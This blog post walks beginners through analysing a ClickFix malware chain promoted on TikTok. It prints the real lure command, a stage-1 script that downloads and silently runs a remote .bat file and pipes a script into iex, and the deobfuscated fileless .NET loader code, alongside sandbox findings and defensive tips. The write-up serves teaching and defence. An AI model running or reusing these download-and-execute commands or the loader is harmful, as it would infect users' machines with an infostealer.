---
title: "Malware Analysis for Beginners"
description: "Follow my real-world malware analysis of a ClickFix attack spreading on TikTok. Learn step-by-step how to analyze malware chains, uncover fileless loaders, and protect yourself from modern threats."
tags:
  - Cybersecurity
  - Malware Analysis
  - TikTok
  - ClickFix
  - Fileless Malware
author: "jimididit"
authorTwitter: "@jimididit"
date: "2025-06-09"
category: "Malware Analysis"
image: /assets/blog/tiktok-clickfix-malware-analysis.webp
---

# How I Traced a Malware Attack Chain for the First Time

---

## Introduction

Malware analysis might seem intimidating ‚Äî but with the right mindset and basic tools, anyone can start following malicious chains and learning how they work.

Recently, I came across a perfect opportunity to sharpen my skills: a **ClickFix attack chain being promoted on TikTok**.

In this post, I‚Äôll share exactly how I analyzed the attack ‚Äî step by step ‚Äî and give you practical tips so you can start doing malware analysis yourself.

---

## How It Started

It all began when I noticed a TikTok video promoting this suspicious PowerShell command:

```powershell
$ iex (iwr actv.cx/windows)
```

The video claimed this command would ‚Äúunlock hidden Windows features‚Äù ‚Äî a textbook example of **social engineering**.

In reality, it was part of a **fileless malware loader chain**, designed to download and execute malicious code entirely in memory.

---

## Initial Analysis ‚Äî Stage 1 Loader

Visiting:

```html
$ https://actv.cx/windows
```

I found this initial PowerShell script:

```batch
powershell Start-Process -WindowStyle Hidden -FilePath cmd.exe \
-ArgumentList '/c curl -k -L -sS https://files.catbox.moe/e699c1.bat \
-o "%TEMP%\1.cmd" && "%TEMP%\1.cmd"' && \
irm https://get.activated.win | iex
```

Summary of behavior:

‚úÖ Downloads and runs a `.bat` file (`e699c1.bat`) hosted on Catbox  
‚úÖ Downloads and executes a script from `https://get.activated.win`

‚ö†Ô∏è Notably, `get.activated.win` normally hosts **Microsoft Activation Scripts (MAS)** and is typically legit ‚Äî attackers were leveraging its reputation to mask the chain.

---

## The Malicious `.bat` File ‚Äî Stage 2 Loader

The second-stage file, `e699c1.bat`, contained **deeply obfuscated PowerShell**.

Key behaviors:

‚úÖ Runs silently:

```batch
$ powershell.exe -ep bypass -w hidden -command ...
```

‚úÖ Reads **encrypted malware payload** from environment variables:

```batch
... $env:LxjWIX.Split('#') | ForEach-Object { (Get-Item ('Env:' + $_)).Value }
```

‚úÖ Decrypts using **TripleDES** (with a static key), decompresses with **GZIP**, and executes result entirely **in memory**:

```batch
...[Reflection.Assembly]::Load($HoJXla).EntryPoint.Invoke(...)
```

Summary:

- **No files written to disk**  
- **Final payload never visible to static antivirus**  

---

## Deep Dive: Obfuscated PowerShell Loader

In the **Stage 2 loader** (`e699c1.bat`), the following PowerShell command was used (formatted for clarity):

```powershell
# Decode base64 chunks stored in environment variable
$X0WP46Cw = [System.Convert]::FromBase64String(
    ($env:LxjWIX.Split('#') | ForEach-Object { 
        (Get-Item ('Env:' + $_)).Value 
    }) -join ''
)

# TripleDES decryption using static key
$smxcwWN = [System.Security.Cryptography.TripleDESCryptoServiceProvider]::new()
$smxcwWN.Key = [byte[]]@(248,219,151,14,81,191,77,159,33,23,84,80,245,223,169,252)
$smxcwWN.Mode = 'ECB'
$smxcwWN.Padding = 'PKCS7'

$GMliInV = $smxcwWN.CreateDecryptor().TransformFinalBlock($X0WP46Cw, 0, $X0WP46Cw.Length)

# GZIP decompress the decrypted payload
$iu70gOF = New-Object System.IO.MemoryStream(,$GMliInV)
$kgJXbzHO = New-Object System.IO.MemoryStream
$VHGnG = New-Object System.IO.Compression.GZipStream($iu70gOF, [IO.Compression.CompressionMode]::Decompress)
$VHGnG.CopyTo($kgJXbzHO)

# Load .NET payload into memory and execute
$HoJXla = $kgJXbzHO.ToArray()
[Reflection.Assembly]::Load($HoJXla).EntryPoint.Invoke($null, $null)
```

### Key Observations

‚úÖ Static TripleDES key ‚Üí indicates the attacker is trying to prevent casual deobfuscation, but it‚Äôs hardcoded  
‚úÖ GZIP compression ‚Üí typical for reducing payload size and adding one more layer of obfuscation  
‚úÖ In-memory .NET assembly load ‚Üí pure fileless execution, making detection harder  
‚úÖ No disk artifacts ‚Üí final malware never touches disk  

---

## Deep Dive: ANY.RUN Dynamic Analysis

To better understand the full malware behavior in a controlled environment, I ran the second-stage `.bat` file through [ANY.RUN](https://any.run), starting from:

```markdown
https://files.catbox.moe/e699c1.bat
```

This provided live visibility into:

### ‚öôÔ∏è Process Tree

- `cmd.exe` ‚Üí launched hidden PowerShell  
- PowerShell ‚Üí executed deeply obfuscated loader  
- Loaded .NET assembly entirely in memory  

### üåê Network Activity

- Initial contact with `actv.cx/windows`  
- Additional requests to `get.activated.win`  
- Possible C2 beaconing (to be confirmed once payload is decrypted)  

### üîç Extracted PowerShell Snippets

```powershell
$env:LxjWIX.Split('#') | ForEach-Object { (Get-Item ('Env:' + $_)).Value } | Out-String
[System.Reflection.Assembly]::Load($HoJXla).EntryPoint.Invoke(...)
```

### üö´ Evasion Techniques Observed

‚úÖ Fileless execution  
‚úÖ Memory-only .NET assembly loading  
‚úÖ Reflection-based execution  
‚úÖ Use of encrypted environment variable for payload staging  
‚úÖ No observable files dropped to disk  

### Unresolved Observations

- Payload decryption: Base64 ‚Üí TripleDES ‚Üí GZIP ‚Üí .NET binary  
- Final payload: Could not be fully captured during this ANY.RUN session  
- Likely targeting **Discord tokens**, browser credentials, or app data (based on common patterns)  

---

## Final Conclusion

This was a **modern ClickFix malware chain**, promoted via TikTok videos and comments:

‚úÖ Fully obfuscated PowerShell-based in-memory loader  
‚úÖ Likely final malware was an **infostealer** (Discord tokens, browser data, app credentials)  
‚úÖ Cleverly leveraged a legit domain (`get.activated.win`) to appear harmless  

The `.bat` loader used **advanced evasion techniques**:

‚úÖ Fileless execution  
‚úÖ In-memory reflection  
‚úÖ Obfuscation  
‚úÖ Environment variable-based payload staging  

---

## Current Status of the Chain

| Component | Status |
|-----------|--------|
| `actv.cx/windows` | Still live |
| `e699c1.bat` on Catbox | Offline / removed |
| `get.activated.win` | Serving legitimate MAS script |
| Final payload | Could not be fully recovered |

---

## Key Takeaway for Users

üö© **NEVER trust PowerShell "tricks" promoted on social media ‚Äî especially anything using `iex (iwr ...)`.**  

This is a textbook example of a **fileless malware delivery chain**, hiding behind tools and domains that appear familiar or trusted.

---

## How You Can Get Started With Malware Analysis

### Recommended Tools

| Category | Tools |
|----------|-------|
| Static analysis | CyberChef, strings, Ghidra |
| Dynamic analysis | Procmon, Process Explorer, Wireshark, FakeNet-NG |
| Domain/Infra analysis | urlscan.io, VirusTotal |
| Memory/binary analysis | dnSpy, PE-bear |
| Sandboxing | Windows VM (snapshot/revert), Cuckoo Sandbox |

### Beginner Workflow

1Ô∏è‚É£ Isolate sample (URL or file) ‚Äî NEVER run on your main system  
2Ô∏è‚É£ Analyze initial script statically (deobfuscate)  
3Ô∏è‚É£ Map out all domains, URLs, staging servers  
4Ô∏è‚É£ Observe dynamic behavior in a safe sandbox  
5Ô∏è‚É£ Extract and analyze any in-memory payloads  
6Ô∏è‚É£ Document your findings (flowcharts are great!)  

### Top Learning Resources

- [Practical Malware Analysis](https://www.nostarch.com/malware) (book)  
- [Malware Unicorn‚Äôs RE101](https://malwareunicorn.org/workshops/re101.html)  
- [The DFIR Report](https://thedfirreport.com/) ‚Äî real-world attack writeups  
- [VX-Underground](https://vx-underground.org/) ‚Äî malware archive  

---

## Final Thoughts

This was one of the first **real-world fileless malware chains** I‚Äôve analyzed so far - and it all started with a simple PowerShell one-liner on TikTok.

**Key lesson**: Malware analysis is incredibly rewarding once you start learning how these attacks really work behind the scenes.

If you want to explore malware analysis:

üëâ Follow my blog for future writeups  
üëâ Check out my [GitHub](https://github.com/jimididit) ‚Äî I‚Äôm publishing tools and analysis scripts soon  
üëâ Join the [Nokturnal Community Discord](https://discord.com/invite/4GTJJ28w) - we actively research attacks like this together  

Stay safe ‚Äî and stay curious. üîç
